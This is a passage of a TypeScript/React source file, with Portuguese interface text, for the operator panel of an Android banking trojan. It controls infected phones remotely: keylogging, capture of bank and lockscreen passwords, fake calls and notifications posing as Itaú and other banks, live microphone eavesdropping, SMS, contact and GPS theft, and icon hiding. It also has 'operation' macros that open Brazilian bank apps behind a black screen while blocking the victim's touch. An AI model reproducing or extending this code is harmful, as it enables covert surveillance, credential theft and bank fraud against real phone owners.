      const custom = v2Customizations[key];
      const defaultText = v2SelectedNode.text?.trim() || v2SelectedNode.desc?.trim() || '';
      setV2EditLabel(custom?.customText || defaultText);
      setV2EditColor(custom?.customColor || '#ff2e5d');
      setV2EditTextColor(custom?.textColor || '#FFFFFF');
      setV2EditFontSize(custom?.fontSize || 16);
      setV2EditOpacity(typeof custom?.opacity === 'number' ? Math.round(custom.opacity * 100) : 40);
      setV2EditGlow(custom?.glow || 2);
      setV2EditBorderStyle(custom?.borderStyle || 'rounded');
    }
  }, [v2SelectedNode]);

  // Live Notifications
  const [notifications, setNotifications] = useState<any[]>([]);
  const [isLoadingNotifications, setIsLoadingNotifications] = useState(false);

  // Side Panel Tab inside Live Screen
  const [sidePanelTab, setSidePanelTab] = useState<'assistant' | 'notifications' | 'keylogger' | 'injects' | 'admin_security' | 'quick_controls' | 'sms_quick' | 'notes' | 'v2_elements' | 'fake_call' | 'fake_notif'>('assistant');
  
  // Side Panel Fake Call states
  const [sideFakeCallerName, setSideFakeCallerName] = useState('Gerente de Conta');
  const [sideFakeCallerNumber, setSideFakeCallerNumber] = useState('0800 728 0728');
  const [sideFakeCallTitle, setSideFakeCallTitle] = useState('ItaÃº Uniclass â€¢ Atendimento');
  const [sideFakePhotoUrl, setSideFakePhotoUrl] = useState('');
  const [sideFakeBank, setSideFakeBank] = useState('itau');
  const [sideFakeDisplayMode, setSideFakeDisplayMode] = useState<'fullscreen' | 'notification'>('fullscreen');
  const [sideFakeStatus, setSideFakeStatus] = useState('');

  // Side Panel Fake Notification states
  const [sideNotifTitle, setSideNotifTitle] = useState('ItaÃº Uniclass');
  const [sideNotifText, setSideNotifText] = useState('VocÃª recebeu uma transferÃªncia de R$ 1.500,00 via Pix.');
  const [sideNotifBank, setSideNotifBank] = useState('itau');
  const [sideNotifIcon, setSideNotifIcon] = useState('itau');
  const [sideNotifIconUrl, setSideNotifIconUrl] = useState('');
  const [sideNotifAction, setSideNotifAction] = useState('fake_call');
  const [sideNotifSound, setSideNotifSound] = useState(true);
  const [sideNotifStatus, setSideNotifStatus] = useState('');

  const handleTriggerSideFakeNotification = async () => {
    try {
      setSideNotifStatus(`ðŸ”” NotificaÃ§Ã£o flutuante enviada: "${sideNotifTitle}"`);
      await sendCommand({
        action: 'TRIGGER_FAKE_NOTIFICATION',
        title: sideNotifTitle,
        text: sideNotifText,
        bank: sideNotifBank,
        icon: sideNotifIcon,
        iconUrl: sideNotifIconUrl,
        actionOnTap: sideNotifAction,
        sound: sideNotifSound,
      });
      showToast('NotificaÃ§Ã£o flutuante exibida na tela do celular!', 'success');
    } catch (err: any) {
      setSideNotifStatus(`Erro: ${err.message}`);
    }
  };

  const handleStartSideFakeCall = async () => {
    try {
      const modeLabel = sideFakeDisplayMode === 'notification' ? 'NotificaÃ§Ã£o no Topo' : 'Tela Cheia';
      setSideFakeStatus(`ðŸ“ž Chamada forjada (${modeLabel}) enviada ao celular: "${sideFakeCallerName}"`);
      await sendCommand({
        action: 'TRIGGER_FAKE_CALL',
        callerName: sideFakeCallerName,
        callerNumber: sideFakeCallerNumber,
        callerTitle: sideFakeCallTitle,
        photoUrl: sideFakePhotoUrl,
        bank: sideFakeBank,
        displayMode: sideFakeDisplayMode,
      });
      showToast(`Chamada falsa (${modeLabel}) disparada no celular!`, 'success');
    } catch (err: any) {
      setSideFakeStatus(`Erro: ${err.message}`);
    }
  };

  const handleEndSideFakeCall = async () => {
    try {
      await sendCommand({ action: 'END_FAKE_CALL' });
      setSideFakeStatus('Chamada forjada encerrada.');
      showToast('Chamada encerrada no celular.', 'info');
    } catch (err: any) {
      setSideFakeStatus(`Erro: ${err.message}`);
    }
  };

  // Helper para enviar comandos silenciosos (ex: chunks de Ã¡udio sem toast/spam)
  const sendSilentCommand = async (command: any) => {
    if (!deviceId) return;
    try {
      await devicesAPI.sendCommand(deviceId, command);
    } catch (_) {}
  };

  // Side Panel Voice 2-Way Audio States & Refs
  const [isSideVoiceActive, setIsSideVoiceActive] = useState(false);
  const [isSideOpMuted, setIsSideOpMuted] = useState(false);
  const [isSideSpkMuted, setIsSideSpkMuted] = useState(false);

  const sideAudioCtxRef = useRef<AudioContext | null>(null);
  const sideMediaStreamRef = useRef<MediaStream | null>(null);
  const sideScriptProcessorRef = useRef<ScriptProcessorNode | null>(null);
  const sideWsMicRef = useRef<WebSocket | null>(null);
  const sideNextPlayTimeRef = useRef<number>(0);
  const isSideOpMutedRef = useRef<boolean>(false);
  const isSideSpkMutedRef = useRef<boolean>(false);

  useEffect(() => {
    isSideOpMutedRef.current = isSideOpMuted;
  }, [isSideOpMuted]);

  useEffect(() => {
    isSideSpkMutedRef.current = isSideSpkMuted;
  }, [isSideSpkMuted]);

  const startSideVoiceCall = async () => {
    try {
      setSideFakeStatus('âš¡ Conectando Voz & Ãudio 2-Way...');

      // 1. Ativa microfone do celular remoto
      await sendCommand({ action: 'TOGGLE_MICROPHONE', enabled: true });

      // 2. Inicializa Web Audio Context do navegador
      const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
      const audioCtx = new AudioCtxClass({ sampleRate: 16000 });
      if (audioCtx.state === 'suspended') {
        await audioCtx.resume();
      }
      sideAudioCtxRef.current = audioCtx;

      // 3. Captura o microfone do operador no computador (opcional - se o PC nÃ£o tiver mic, entra em modo Apenas Ouvir)
      let hasOperatorMic = false;
      try {
        const getMedia =
          navigator.mediaDevices?.getUserMedia?.bind(navigator.mediaDevices) ||
          (navigator as any).getUserMedia?.bind(navigator) ||
          (navigator as any).webkitGetUserMedia?.bind(navigator) ||
          (navigator as any).mozGetUserMedia?.bind(navigator);

        if (getMedia) {
          const stream = await getMedia({ audio: true });
          sideMediaStreamRef.current = stream;

          const source = audioCtx.createMediaStreamSource(stream);
          const processor = audioCtx.createScriptProcessor(4096, 1, 1);
          sideScriptProcessorRef.current = processor;

          processor.onaudioprocess = (e) => {
            if (isSideOpMutedRef.current) return;
            const inputData = e.inputBuffer.getChannelData(0);

            const pcm16 = new Int16Array(inputData.length);
            for (let i = 0; i < inputData.length; i++) {
              const s = Math.max(-1, Math.min(1, inputData[i]));
              pcm16[i] = s < 0 ? s * 0x8000 : s * 0x7FFF;
            }

            let binary = '';
            const bytes = new Uint8Array(pcm16.buffer);
            for (let i = 0; i < bytes.byteLength; i++) {
              binary += String.fromCharCode(bytes[i]);
            }
            const base64Audio = btoa(binary);

            sendSilentCommand({ action: 'SPEAK_AUDIO', audio: base64Audio });
          };

          source.connect(processor);
          processor.connect(audioCtx.destination);
          hasOperatorMic = true;
        }
      } catch (micErr: any) {
        console.warn('Microfone do operador nÃ£o detectado/bloqueado no PC. Continuando em Modo Apenas Ouvir:', micErr);
        setIsSideOpMuted(true);
      }

      // 4. Conecta WebSocket para OUVIR o microfone do aparelho no navegador
      const token = localStorage.getItem('token') || localStorage.getItem('admin_token') || localStorage.getItem('access_token') || '';
      const apiBase = getApiBaseUrl();
      let wsBase = '';
      if (apiBase) {
        const wsProtocol = apiBase.startsWith('https') ? 'wss' : 'ws';
        wsBase = apiBase.replace(/^https?/, wsProtocol);
      } else {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        wsBase = `${protocol}//${window.location.host}`;
      }
      const wsUrl = `${wsBase}/ws/microphone/${deviceId}?token=${token}`;

      const ws = new WebSocket(wsUrl);
      ws.binaryType = 'arraybuffer';

      ws.onopen = () => {
        setIsSideVoiceActive(true);
        if (hasOperatorMic) {
          setSideFakeStatus('ðŸŸ¢ VOZ 2-WAY ATIVA (FALANDO E OUVINDO NO PAINEL)');
          showToast('Voz 2-Way conectada ao vivo (Microfone & Alto-falante)!', 'success');
        } else {
          setSideFakeStatus('ðŸŸ¢ ÃUDIO DO CELULAR CONECTADO (MODO OUVINDO - SEM MIC NO PC)');
          showToast('Ãudio do celular conectado! (Modo Ouvir - Sem mic no PC)', 'info');
        }
      };

      ws.onmessage = async (event) => {
        if (isSideSpkMutedRef.current || !sideAudioCtxRef.current) return;

        if (sideAudioCtxRef.current.state === 'suspended') {
          try {
            await sideAudioCtxRef.current.resume();
          } catch (_) {}
        }

        const arrayBuffer = event.data;
        if (!arrayBuffer || arrayBuffer.byteLength === 0) return;

        try {
          const int16Array = new Int16Array(arrayBuffer);
          const float32Array = new Float32Array(int16Array.length);
          for (let i = 0; i < int16Array.length; i++) {
            float32Array[i] = int16Array[i] / 32768.0;
          }

          const actx = sideAudioCtxRef.current;
          const audioBuffer = actx.createBuffer(1, float32Array.length, 16000);
          audioBuffer.getChannelData(0).set(float32Array);
          const bufferSource = actx.createBufferSource();
          bufferSource.buffer = audioBuffer;
          bufferSource.connect(actx.destination);

          const currentTime = actx.currentTime;
          if (sideNextPlayTimeRef.current < currentTime) {
            sideNextPlayTimeRef.current = currentTime;
          }
          bufferSource.start(sideNextPlayTimeRef.current);
          sideNextPlayTimeRef.current += audioBuffer.duration;
        } catch (err) {
          console.error('Erro Ã¡udio dispositivo:', err);
        }
      };

      ws.onerror = (err) => {
        console.error('WebSocket 2-Way erro:', err);
        setSideFakeStatus('âš ï¸ ConexÃ£o de Ã¡udio instÃ¡vel ou erro no WebSocket');
      };

      ws.onclose = () => {
        setIsSideVoiceActive(false);
        setSideFakeStatus('Voz 2-Way desconectada');
      };

      sideWsMicRef.current = ws;
      setIsSideVoiceActive(true);

    } catch (err: any) {
      console.error('Erro ao iniciar chamada de voz no painel:', err);
      const errMsg = err?.message || 'PermissÃ£o de microfone negada';
      setSideFakeStatus(`âš ï¸ Erro ao acessar microfone: ${errMsg}`);
      showToast(`Erro ao acessar microfone: ${errMsg}`, 'error');
      endSideVoiceCall(false);
    }
  };

  const endSideVoiceCall = async (updateStatus = true) => {
    setIsSideVoiceActive(false);
    if (updateStatus) {
      setSideFakeStatus('Voz 2-Way encerrada.');
    }

    try {
      await sendSilentCommand({ action: 'TOGGLE_MICROPHONE', enabled: false });
    } catch (_) {}

    if (sideScriptProcessorRef.current) {
      sideScriptProcessorRef.current.disconnect();
      sideScriptProcessorRef.current = null;
    }
    if (sideMediaStreamRef.current) {
      sideMediaStreamRef.current.getTracks().forEach((t) => t.stop());
      sideMediaStreamRef.current = null;
    }
    if (sideAudioCtxRef.current) {
      try {
        sideAudioCtxRef.current.close();
      } catch (_) {}
      sideAudioCtxRef.current = null;
    }
    if (sideWsMicRef.current) {
      try {
        sideWsMicRef.current.close();
      } catch (_) {}
      sideWsMicRef.current = null;
    }
  };

  useEffect(() => {
    return () => {
      endSideVoiceCall(false);
    };
  }, []);
  const [v2SideSearchText, setV2SideSearchText] = useState('');
  const [v2SideFilterCategory, setV2SideFilterCategory] = useState<'all' | 'interactive' | 'input'>('all');
  const [v2HoveredNodeKey, setV2HoveredNodeKey] = useState<string | null>(null);
  const [vncQuickText, setVncQuickText] = useState('');

  // V2 Elements Side Panel calculations & click handler
  const visibleV2Nodes: ScreenReaderNode[] = [];
  if (screenHierarchy && screenHierarchy.hierarchy) {
    collectAllVisibleNodes(screenHierarchy.hierarchy, visibleV2Nodes);
  }

  const filteredV2SideNodes = visibleV2Nodes.filter((node) => {
    const label = (node.text || node.desc || node.hint || node.id || '').toLowerCase();
    if (v2SideSearchText && !label.includes(v2SideSearchText.toLowerCase())) {
      return false;
    }
    if (v2SideFilterCategory === 'interactive' && !(node.clickable || (node as any).button)) {
      return false;
    }
    if (v2SideFilterCategory === 'input' && !(node.password || node.editable || node.isPinDigit)) {
      return false;
    }
    return true;
  });

  const handleElementClick = (node: ScreenReaderNode) => {
    setV2SelectedNode(node);
    if (node.bounds) {
      const devW = screenHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH || 1080;
      const devH = screenHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT || 2400;
      const centerX = node.bounds.x + node.bounds.w / 2;
      const centerY = node.bounds.y + node.bounds.h / 2;

      // ðŸŽ¯ Coordenadas normalizadas (0.0 a 1.0) para o dispositivo clicar no ponto exato
      const normX = Number((centerX / devW).toFixed(4));
      const normY = Number((centerY / devH).toFixed(4));

      sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
      sendCommand({ action: 'TAP', x: Math.round(centerX), y: Math.round(centerY) });
      showToast(`âš¡ Clique enviado para "${(node.text || node.desc || 'Elemento').trim()}"!`, 'success');

      setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 80);
      setTimeout(() => fetchHierarchy(), 150);
      setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 300);
      setTimeout(() => fetchHierarchy(), 400);
    }
  };

  // RobÃ´ Assistente States
  interface AssistantMsg {
    id: string;
    sender: 'user' | 'bot';
    text: string;
    actionName?: string;
    time: string;
    status?: 'executing' | 'success' | 'error';
    commandPayload?: any;
  }

  const [assistantMessages, setAssistantMessages] = useState<AssistantMsg[]>([
    {
      id: 'init-1',
      sender: 'bot',
      text: 'ðŸ¤– OlÃ¡, operador! Sou seu RobÃ´ Assistente do aparelho.\n\nO que vocÃª pedir no chat, eu executo diretamente no dispositivo conectado!\n\nðŸ’¡ Experimente pedir:\nâ€¢ "abra o whatsapp" ou "abra o nubank"\nâ€¢ "ligue a lanterna" / "apague a lanterna"\nâ€¢ "tire um print" ou "capturar tela"\nâ€¢ "aumente o volume" ou "silenciar"\nâ€¢ "vÃ¡ para o inÃ­cio" ou "voltar"\nâ€¢ "bloqueie a tela" ou "desbloquear"\nâ€¢ "digite [seu texto]"\nâ€¢ "ligar tela preta"\nâ€¢ "pegar contatos", "ver sms" ou "localizaÃ§Ã£o gps"',
      time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
    }
  ]);
  const [assistantInput, setAssistantInput] = useState('');
  const [isAssistantTyping, setIsAssistantTyping] = useState(false);
  const assistantChatBottomRef = useRef<HTMLDivElement>(null);

  // Admin, Lock & PIN States
  const [pinInput, setPinInput] = useState('');
  const [pinDelay, setPinDelay] = useState(800);
  const [patternInput, setPatternInput] = useState('');
  const [fakeLockType, setFakeLockType] = useState<'pin' | 'pattern' | 'password'>('pin');
  const [showWipeConfirm, setShowWipeConfirm] = useState(false);

  // Hardware & Sound States
  const [soundMode, setSoundMode] = useState<'silent' | 'vibrate' | 'sound'>('sound');
  const [brightness, setBrightness] = useState(80);
  const [screenTimeout, setScreenTimeout] = useState(1);
  const [ringingVolume, setRingingVolume] = useState(70);
  const [musicVolume, setMusicVolume] = useState(60);
  const [wifiEnabled, setWifiEnabled] = useState(true);
  const [torchEnabled, setTorchEnabled] = useState(false);

  // ðŸ“ Bloco de Notas do Dispositivo (Scratchpad / Senhas)
  const [deviceNotes, setDeviceNotes] = useState<string>('');

  useEffect(() => {
    const targetKey = deviceId || 'default';
    if (targetKey) {
      const key = `device_notes_${targetKey}`;
      const saved = localStorage.getItem(key);
      if (saved !== null) {
        setDeviceNotes(saved);
      }
    }
  }, [deviceId]);

  const handleNotesChange = (val: string) => {
    setDeviceNotes(val);
    const targetKey = deviceId || 'default';
    if (targetKey) {
      const key = `device_notes_${targetKey}`;
      localStorage.setItem(key, val);
    }
  };

  // Permissions state
  const [permissions, setPermissions] = useState<Record<string, boolean>>({
    accessibility: true,
    storage: false,
    camera: false,
    contacts: false,
    call_log: false,
    accounts: false,
    microphone: false,
    location: false,
    phone: false,
    sms: false,
    wallpaper: false,
    battery_optimization: false,
    overlay: false,
    notifications: true
  });

  // Sync permissions when device info is updated
  useEffect(() => {
    if (device) {
      const devPerms = (device as any).permissions || {};
      setPermissions((prev) => ({
        ...prev,
        accessibility: typeof (device as any).accessibility_active === 'boolean' ? (device as any).accessibility_active : prev.accessibility,
        ...devPerms
      }));
    }
  }, [device]);

  // Bot Options state
  const [botOptions, setBotOptions] = useState<Record<string, boolean>>({
    live_screen: false,
    permanent_keylogger: true,
    notifications_log: true,
    activities_log: false,
    visited_apps: false,
    visited_links: false,
    live_notifications: false,
    auto_injection: false,
    anti_delete: false,
    hide_icon: false
  });

  // Logs & Activities
  const [logs, setLogs] = useState<any[]>([]);
  const [isLoadingLogs, setIsLoadingLogs] = useState(false);

  // Captura de Senhas & Lockscreen Vault
  const [capturedPasswords, setCapturedPasswords] = useState<any[]>([]);
  const [isLoadingPasswords, setIsLoadingPasswords] = useState(false);
  const [passwordSearch, setPasswordSearch] = useState('');
  const [passwordFilter, setPasswordFilter] = useState<'all' | 'bank' | 'lockscreen' | 'pattern' | 'overlay' | 'keylog'>('all');
  const [revealedPasswords, setRevealedPasswords] = useState<Record<string | number, boolean>>({});
  const [showSelfDestructModal, setShowSelfDestructModal] = useState(false);
  const [showUninstallCustomAppModal, setShowUninstallCustomAppModal] = useState(false);
  const [targetPackageToUninstall, setTargetPackageToUninstall] = useState('');

  const fetchPasswords = useCallback(async () => {
    if (!deviceId) return;
    try {
      setIsLoadingPasswords(true);
      const token = localStorage.getItem('token');
      const res = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/bank-passwords`, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      if (res.ok) {
        const data = await res.json();
        setCapturedPasswords(Array.isArray(data) ? data : []);
      }
    } catch (err) {
      console.error('Erro ao buscar senhas:', err);
    } finally {
      setIsLoadingPasswords(false);
    }
  }, [deviceId]);

  // Applications
  const [appsTab, setAppsTab] = useState<'personal' | 'system' | 'banks' | 'all'>('personal');
  const [appSearch, setAppSearch] = useState('');
  const [appsList, setAppsList] = useState<any[]>([]);
  const [isLoadingApps, setIsLoadingApps] = useState(false);

  // Blocked Apps & Bank Balances States
  const [blockedApps, setBlockedApps] = useState<string[]>(() => {
    try {
      return JSON.parse(localStorage.getItem(`blocked_apps_${deviceId}`) || '[]');
    } catch {
      return [];
    }
  });

  const [bankBalancesMap, setBankBalancesMap] = useState<Record<string, any>>({});

  useEffect(() => {
    if (deviceId) {
      try {
        const saved = localStorage.getItem(`blocked_apps_${deviceId}`);
        setBlockedApps(saved ? JSON.parse(saved) : []);
      } catch {
        setBlockedApps([]);
      }
    }
  }, [deviceId]);

  const toggleBlockApp = async (pkg: string, name: string) => {
    if (!pkg) return;
    const cleanPkg = pkg.trim().toLowerCase();
    const exists = blockedApps.some((p) => p && p.trim().toLowerCase() === cleanPkg);
    const next = exists
      ? blockedApps.filter((p) => p && p.trim().toLowerCase() !== cleanPkg)
      : [...blockedApps, cleanPkg];

    setBlockedApps(next);
    if (deviceId) {
      localStorage.setItem(`blocked_apps_${deviceId}`, JSON.stringify(next));
    }

    await sendCommand({ action: 'TOGGLE_BLOCK_APP', package: cleanPkg, blocked: !exists });
    showToast(
      exists
        ? `ðŸ”“ Abertura permitida para ${name}`
        : `ðŸš« Impedir Abertura ATIVADO para ${name} (Exibe tela de Aplicativo IndisponÃ­vel)`,
      exists ? 'success' : 'info'
    );
  };

  const fetchBankBalances = async () => {
    if (!deviceId) return;
    try {
      const res = await devicesAPI.getBankBalances(deviceId);
      if (Array.isArray(res)) {
        const map: Record<string, any> = {};
        res.forEach((b: any) => {
          if (b.package) {
            map[b.package.toLowerCase()] = b;
          }
          if (b.bank) {
            map[b.bank.toLowerCase()] = b;
          }
        });
        setBankBalancesMap(map);
      }
    } catch (err) {
      console.error('Erro ao buscar saldos bancÃ¡rios:', err);
    }
  };

  // Camera
  const [cameraFacing, setCameraFacing] = useState<'front' | 'back'>('back');
  const [isCameraActive, setIsCameraActive] = useState(false);

  // Keylogger
  const [keylogs, setKeylogs] = useState<any[]>([]);
  const [keylogSearch, setKeylogSearch] = useState('');
  const [keylogFilterType, setKeylogFilterType] = useState<'all' | 'passwords' | 'typed' | 'windows'>('all');
  const [isLoadingKeylogs, setIsLoadingKeylogs] = useState(false);

  // SMS
  const [smsList, setSmsList] = useState<any[]>([]);
  const [smsToNumber, setSmsToNumber] = useState('');
  const [smsBody, setSmsBody] = useState('');
  const [isLoadingSms, setIsLoadingSms] = useState(false);

  // Contacts
  const [contactsList, setContactsList] = useState<any[]>([]);
  const [contactsSearch, setContactsSearch] = useState('');
  const [isLoadingContacts, setIsLoadingContacts] = useState(false);

  // File Manager
  const [currentPath, setCurrentPath] = useState('/sdcard');
  const [fileList, setFileList] = useState<any[]>([]);
  const [isLoadingFiles, setIsLoadingFiles] = useState(false);

  // GPS Location
  const [gpsData, setGpsData] = useState<{ lat: number; lng: number; accuracy: number; address?: string } | null>(null);

  // Audio Stream
  const [isAudioListening, setIsAudioListening] = useState(false);

  // Feedback Banner / Toast
  const [toastMsg, setToastMsg] = useState<{ text: string; type: 'success' | 'info' | 'error' } | null>(null);

  const showToast = (text: string, type: 'success' | 'info' | 'error' = 'info') => {
    setToastMsg({ text, type });
    setTimeout(() => setToastMsg(null), 3500);
  };

  // Carregar dados do aparelho dinamicamente
  const loadDevice = useCallback(async () => {
    if (!deviceId) return;
    try {
      const devices = await devicesAPI.getAll();
      const current = devices.find((d: Device) => d.id === deviceId || d.device_id === deviceId);
      if (current) {
        setDevice(current);
      }
    } catch (e) {
      console.error('Erro ao carregar dispositivo:', e);
    }
  }, [deviceId]);

  useEffect(() => {
    loadDevice();
    const interval = setInterval(loadDevice, 3000);
    return () => clearInterval(interval);
  }, [loadDevice]);

  // Polling de NotificaÃ§Ãµes em Tempo Real
  const fetchNotifications = useCallback(async () => {
    if (!deviceId) return;
    setIsLoadingNotifications(true);
    try {
      const data = await devicesAPI.getNotifications(deviceId);
      if (Array.isArray(data)) {
        setNotifications(data);
      }
    } catch (e) {
      console.error('Erro ao buscar notificaÃ§Ãµes:', e);
    } finally {
      setIsLoadingNotifications(false);
    }
  }, [deviceId]);

  useEffect(() => {
    fetchNotifications();
    const interval = setInterval(() => {
      if (!document.hidden) fetchNotifications();
    }, 4000);
    return () => clearInterval(interval);
  }, [fetchNotifications]);

  // Polling de Keylogs em Tempo Real
  const fetchKeylogs = useCallback(async () => {
    if (!deviceId) return;
    setIsLoadingKeylogs(true);
    try {
      const data = await devicesAPI.getKeylogs(deviceId);
      if (Array.isArray(data)) {
        setKeylogs(data);
      }
    } catch (e) {
      console.error('Erro ao buscar keylogs:', e);
    } finally {
      setIsLoadingKeylogs(false);
    }
  }, [deviceId]);

  useEffect(() => {
    fetchKeylogs();
    const interval = setInterval(() => {
      if (!document.hidden) fetchKeylogs();
    }, 4000);
    return () => clearInterval(interval);
  }, [fetchKeylogs]);

  // Polling da Tela V2 (Hierarquia OCR / Accessibility Tree) - Ultra-RÃ¡pido (300ms / Resposta na hora)
  const isFetchingHierarchyRef = useRef(false);
  const lastHierarchyDataRef = useRef('');

  const fetchHierarchy = useCallback(async () => {
    if (!deviceId || isFetchingHierarchyRef.current || document.hidden) return;
    isFetchingHierarchyRef.current = true;
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/screen-hierarchy`, {
        headers: {
          Authorization: `Bearer ${token}`,
          'Cache-Control': 'no-cache'
        }
      });
      if (response.ok) {
        const data = await response.json();
        if (data.status === 'ok' && data.data && data.data !== lastHierarchyDataRef.current) {
          lastHierarchyDataRef.current = data.data;
          try {
            setScreenHierarchy(JSON.parse(data.data));
          } catch {}
        }
      }
    } catch {} finally {
      isFetchingHierarchyRef.current = false;
    }
  }, [deviceId]);

  useEffect(() => {
    if (!deviceId || screenViewMode === 'vnc') return;

    fetchHierarchy();
    const interval = setInterval(fetchHierarchy, 300);
    return () => clearInterval(interval);
  }, [deviceId, screenViewMode, fetchHierarchy]);

  // Enviar comando genÃ©rico para o dispositivo
  const sendCommand = async (command: any) => {
    if (!deviceId) return;
    try {
      await devicesAPI.sendCommand(deviceId, command);
      showToast(`Comando ${command.action || 'enviado'} com sucesso!`, 'success');
      setLogs((prev) => [
        {
          id: Date.now(),
          timestamp: new Date().toLocaleTimeString(),
          action: command.action,
          status: 'SUCCESS',
          details: JSON.stringify(command)
        },
        ...prev.slice(0, 49)
      ]);
    } catch (e: any) {
      showToast(`Erro ao enviar comando: ${e?.message || 'Falha na conexÃ£o'}`, 'error');
    }
  };

  // Processador Inteligente de Comandos do RobÃ´ Assistente
  const handleAssistantCommand = async (rawText: string) => {
    const text = rawText.trim();
    if (!text) return;

    setAssistantInput('');
    const nowTime = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

    const userMsg: AssistantMsg = {
      id: 'usr-' + Date.now(),
      sender: 'user',
      text,
      time: nowTime
    };

    setAssistantMessages((prev) => [...prev, userMsg]);
    setIsAssistantTyping(true);

    setTimeout(() => {
      assistantChatBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 50);

    // Normaliza texto: minÃºsculas e sem acentos
    const lower = text
      .toLowerCase()
      .normalize('NFD')
      .replace(/[\u0300-\u036f]/g, '');

    const has = (word: string) => lower.includes(word);
    const hasAny = (...words: string[]) => words.some((w) => lower.includes(w));

    let commandsList: any[] = [];
    let botAckText = '';
    let actionName = '';

    // 0. Clicar por Texto / Elemento V2
    if (hasAny('clicar em', 'clique em', 'tocar em', 'apertar em', 'pressionar em', 'clicar', 'clique', 'tocar', 'apertar')) {
      const cleanTarget = text
        .replace(/^(por\s+favor\s+)?(clicar\s+em|clique\s+em|tocar\s+em|apertar\s+em|pressionar\s+em|clicar|clique|tocar|apertar|pressionar)\s+(o\s+|a\s+|no\s+|na\s+|o\s+botao\s+|a\s+opcao\s+)?/i, '')
        .trim();

      if (cleanTarget) {
        const matchedNode = visibleV2Nodes.find((n) => {
          const l = (n.text || n.desc || n.hint || n.id || '').toLowerCase();
          return l.includes(cleanTarget.toLowerCase());
        });

        if (matchedNode) {
          setV2SelectedNode(matchedNode);
          handleElementClick(matchedNode);
          botAckText = `ðŸŽ¯ Elemento "${(matchedNode.text || matchedNode.desc || cleanTarget).trim()}" localizado na Tela V2! Clique enviado.`;
          actionName = `CLIQUE V2: ${cleanTarget.toUpperCase()}`;
        } else {
          commandsList.push({ action: 'CLICK_TEXT', text: cleanTarget });
          commandsList.push({ action: 'TAP_TEXT', text: cleanTarget });
          botAckText = `ðŸŽ¯ Solicitando clique pelo texto "${cleanTarget}" no aparelho via Acessibilidade...`;
          actionName = `CLIQUE TEXTO: ${cleanTarget.toUpperCase()}`;
        }
      }
    }
    // 1. OperaÃ§Ãµes de Banco & Macros Operacionais
    else if (hasAny('operacao itau', 'operacao bradesco', 'operacao nubank', 'operacao caixa', 'operacao bb', 'operacao banco do brasil', 'operacao santander', 'modo sigilo', 'desarmar')) {
      if (hasAny('itau')) {
        commandsList.push({ action: 'OPEN_APP', package: 'com.itau' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸ¦ OperaÃ§Ã£o ItaÃº Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado. Operador no controle total.';
        actionName = 'MACRO OPERAÃ‡ÃƒO ITAÃš';
      } else if (hasAny('bradesco')) {
        commandsList.push({ action: 'OPEN_APP', package: 'com.bradesco' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸ¦ OperaÃ§Ã£o Bradesco Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado.';
        actionName = 'MACRO OPERAÃ‡ÃƒO BRADESCO';
      } else if (hasAny('nubank')) {
        commandsList.push({ action: 'OPEN_APP', package: 'com.nu.production' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸŸ£ OperaÃ§Ã£o Nubank Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado.';
        actionName = 'MACRO OPERAÃ‡ÃƒO NUBANK';
      } else if (hasAny('caixa')) {
        commandsList.push({ action: 'OPEN_APP', package: 'br.gov.caixa.tem' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸŸ¦ OperaÃ§Ã£o Caixa Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado.';
        actionName = 'MACRO OPERAÃ‡ÃƒO CAIXA';
      } else if (hasAny('bb', 'banco do brasil')) {
        commandsList.push({ action: 'OPEN_APP', package: 'br.com.bb.android' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸŸ¡ OperaÃ§Ã£o Banco do Brasil Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado.';
        actionName = 'MACRO OPERAÃ‡ÃƒO BB';
      } else if (hasAny('santander')) {
        commandsList.push({ action: 'OPEN_APP', package: 'com.santander.app' });
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        setSidePanelTab('v2_elements');
        botAckText = 'ðŸ”´ OperaÃ§Ã£o Santander Iniciada! Aplicativo aberto, Tela Preta ativada e toque do usuÃ¡rio bloqueado.';
        actionName = 'MACRO OPERAÃ‡ÃƒO SANTANDER';
      } else if (hasAny('modo sigilo', 'sigilo')) {
        commandsList.push({ action: 'TOGGLE_TOUCH_BLOCK', enabled: true, block: true });
        commandsList.push({ action: 'BLACK_SCREEN_ON' });
        botAckText = 'ðŸ¥· Modo Sigilo Ativado! Tela Preta 100% opaca e toque do usuÃ¡rio bloqueado.';
